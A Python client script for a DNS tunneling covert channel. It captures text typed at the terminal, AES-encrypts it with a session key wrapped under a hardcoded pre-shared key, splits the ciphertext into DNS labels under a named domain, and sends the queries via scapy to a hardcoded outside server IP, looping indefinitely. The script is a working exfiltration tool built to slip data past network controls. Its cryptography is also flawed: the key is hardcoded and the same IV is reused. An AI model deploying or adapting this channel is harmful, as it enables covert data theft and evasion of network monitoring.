#!/usr/bin/env python3

import time
import threading
import sys
import tty
import termios
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from scapy.all import *
import base64
import socket
import select

# Configuration
DNS_SERVER_IP = '13.228.229.230'  # Replace with your DNS server IP
DNS_PORT = 53
DOMAIN = 'sub.brightbuys.me'  # Replace with your target domain

# Pre-shared key (PSK) for exchanging the AES key securely
psk = b"thisisaverysecurekey123456789012"  # Must be 16, 24, or 32 bytes long

# Placeholder for the user input
user_input = ""

# Function to capture user input for a specified duration (10 seconds)
def capture_user_input(duration=10):
    global user_input
    user_input = ""  # Reset user input at the start of each capture
    print(f"You have {duration} seconds to type your message:")

    # Set stdin to raw mode to capture each character immediately
    fd = sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)
    tty.setraw(fd)

    try:
        end_time = time.time() + duration
        while time.time() < end_time:
            if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
                char = sys.stdin.read(1)
                if char:
                    user_input += char
    finally:
        # Restore the original terminal settings
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)

    print("\nInput capturing complete.")

# Encrypt AES key using PSK
def encrypt_with_psk(aes_key, psk, iv):
    cipher = AES.new(psk, AES.MODE_CBC, iv)
    encrypted_aes_key = cipher.encrypt(pad(aes_key, AES.block_size))
    return base64.b64encode(iv + encrypted_aes_key).decode('utf-8')

# AES encryption
def encrypt_aes(data, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_data = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
    encrypted_message = base64.b64encode(iv + encrypted_data).decode('utf-8')
    print(f"[CLIENT] Original message: {data}")
    print(f"[CLIENT] Encrypted message (base64): {encrypted_message}")
    return encrypted_message

# AES decryption
def decrypt_aes(data, key):
    try:
        print(f"[CLIENT] Encrypted data (base64) for decryption: {data}")
        data = base64.b64decode(data)
        iv = data[:16]
        encrypted_message = data[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_data = unpad(cipher.decrypt(encrypted_message), AES.block_size)
        print(f"[CLIENT] Decrypted message: {decrypted_data.decode('utf-8')}")
        return decrypted_data.decode('utf-8')
    except Exception as e:
        print(f"[CLIENT] Decryption error: {e}")
        return None

# Fragment message to fit within DNS label size limits
def fragment_message(message, max_label_length=63):
    missing_padding = len(message) % 4
    if missing_padding:
        message += '=' * (4 - missing_padding)
    fragments = []
    while message:
        fragments.append(message[:max_label_length])
        message = message[max_label_length:]
    return fragments

# Craft DNS query based on the query type (TXT, CNAME, or A)
def craft_dns_query(fragment, domain, query_type='TXT'):
    if not fragment:
        print("Error: Empty fragment, skipping query")
        return None
    full_query_name = f"{fragment}.{domain}."
    print(f"Sending DNS Query: {full_query_name}")
    qtype_mapping = {'TXT': 16, 'CNAME': 5, 'A': 1}
    qtype_value = qtype_mapping.get(query_type, 16)
    dns_query = (
        IP(dst=DNS_SERVER_IP) /
        UDP(sport=RandShort(), dport=53) /
        DNS(rd=1, qd=DNSQR(qname=full_query_name, qtype=qtype_value))
    )
    return dns_query

# Send DNS query based on the query type
def send_dns_query(server_ip, query_pkt, timeout=10):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        send(query_pkt)
        response, _ = sock.recvfrom(1024)
        print(f"[CLIENT] Received response: {response}")
        return response
    except socket.timeout:
        print("[CLIENT] DNS query timeout.")
    finally:
        sock.close()

# Main function with a continuous loop
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 client.py <query_type>")
        sys.exit(1)

    query_type = sys.argv[1].upper()

    # Run the input capture and message sending in a continuous loop
    while True:
        # Step 1: Capture user input for 10 seconds using a non-blocking approach
        capture_thread = threading.Thread(target=capture_user_input, args=(10,))
        capture_thread.start()
        capture_thread.join()

        if not user_input.strip():
            print("[CLIENT] No input captured, continuing...")
            continue

        message_to_send = user_input.strip()

        # Step 2: Generate AES key and IV for the session
        aes_key = get_random_bytes(32)  # 32 bytes for AES-256
        aes_iv = get_random_bytes(16)

        # Step 3: Encrypt the AES key using the PSK
        encrypted_aes_key = encrypt_with_psk(aes_key, psk, aes_iv)
        encrypted_aes_key_fragments = fragment_message(encrypted_aes_key)

        # Step 4: Send the encrypted AES key as DNS queries
        for fragment in encrypted_aes_key_fragments:
            query_pkt = craft_dns_query(fragment, DOMAIN, 'TXT')
            print(f"[CLIENT] Sending AES key fragment: {fragment}")
            send_dns_query(DNS_SERVER_IP, query_pkt)

        # Step 5: Encrypt the actual message using the AES key
        encrypted_message = encrypt_aes(message_to_send, aes_key, aes_iv)
        fragments = fragment_message(encrypted_message)

        # Step 6: Send the encrypted message as DNS queries
        for fragment in fragments:
            query_pkt = craft_dns_query(fragment, DOMAIN, query_type)
            print(f"[CLIENT] Sending message fragment: {fragment}")
            send_dns_query(DNS_SERVER_IP, query_pkt)

        print("[CLIENT] All messages sent, waiting for the next input.")
